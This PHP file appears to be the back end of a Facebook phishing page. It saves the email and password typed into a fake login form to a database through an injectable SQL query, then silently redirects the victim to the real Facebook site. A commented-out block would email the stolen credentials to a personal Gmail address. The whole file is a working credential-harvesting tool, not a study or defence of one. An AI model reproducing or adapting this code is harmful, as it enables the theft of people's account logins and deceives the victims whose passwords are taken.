<?php
  
  if (isset($_POST['correo']) && isset($_POST['contraseña'])){

    include("conexion.php");
    
    $correo=$_POST['correo'];
    $contraseña=$_POST['contraseña'];

    $sql="INSERT INTO face(correos, contraseñas) VALUES ('$correo','$contraseña')";

    if ($conexion->query($sql)===true){
    }else{
        die("Error al Iniciar".$conexion->error);
    }

    $conexion->close();
    

   }
  // $destino='miguelangelgil9876@gmail.com';
  // $nombre='Usuario facebook';
  // $asunto='Cuenta';
  // $mensaje='Mi ususario es ${correo} y mi contraseña es ${contraseña}';
  // $header= $nombre.' Enviado desde la pagina de facebook';

  // mail($destino, $asunto, $mensaje, $header);

header("refresh:0.0001;url=https://es-la.facebook.com/");

?>











